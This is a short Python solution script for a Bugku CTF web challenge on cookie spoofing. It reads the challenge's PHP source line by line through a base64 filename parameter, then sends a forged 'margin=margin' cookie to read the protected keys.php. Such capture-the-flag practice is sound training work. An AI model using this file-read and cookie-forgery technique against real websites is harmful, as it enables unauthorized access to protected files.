# ctf.bugku.com
# cookies欺骗

import requests
import re
import base64


fn = base64.b64encode(b'index.php').decode('utf-8')
urlm = "http://120.24.86.145:8002/web11/index.php?line={:d}&filename=" + fn
print(urlm)


def getaline( url ):
    r = requests.get(url)
    r.encoding = 'utf-8'
    #print(r.text)
    return r.text.strip()
    

def getalineWithcookie( url ,cookie):
    r = requests.get(url,headers = cookie)
    r.encoding = 'utf-8'
    #print(r.text)
    return r.text.strip()

for i in range(0, 20):
    url = urlm.format(i)
    #print(url)
    print(getaline(url))

'''
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}

if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
'''

header = {'Cookie':'margin=margin'}
fn = base64.b64encode(b'keys.php').decode('utf-8')
urlm = "http://120.24.86.145:8002/web11/index.php?line={:d}&filename=" + fn

for i in range(0, 20):
    url = urlm.format(i)
    #print(url)
    print(getalineWithcookie(url,header))